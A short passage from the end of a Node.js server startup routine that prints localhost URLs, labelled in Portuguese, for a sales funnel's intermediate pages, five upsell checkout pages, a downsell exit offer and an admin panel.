  console.log(`💳 Checkout UP1:           http://localhost:${PORT}/up1/pagamento`);
  console.log(`📄 Página Intermediária 2:  http://localhost:${PORT}/2`);
  console.log(`💳 Checkout UP2:           http://localhost:${PORT}/up2/pagamento`);
  console.log(`📄 Página Intermediária 3:  http://localhost:${PORT}/3`);
  console.log(`💳 Checkout UP3:           http://localhost:${PORT}/up3/pagamento`);
  console.log(`📄 Página Intermediária 4:  http://localhost:${PORT}/4`);
  console.log(`💳 Checkout UP4:           http://localhost:${PORT}/up4/pagamento`);
  console.log(`📄 Página Intermediária 5:  http://localhost:${PORT}/up5`);
  console.log(`💳 Checkout UP5:           http://localhost:${PORT}/up5/pagamento`);
  console.log(`🔥 Downsell / Saída:        http://localhost:${PORT}/oferta-final`);
  console.log(`📊 Painel Administrativo:  http://localhost:${PORT}/painel`);
  console.log(`======================================================\n`);
});
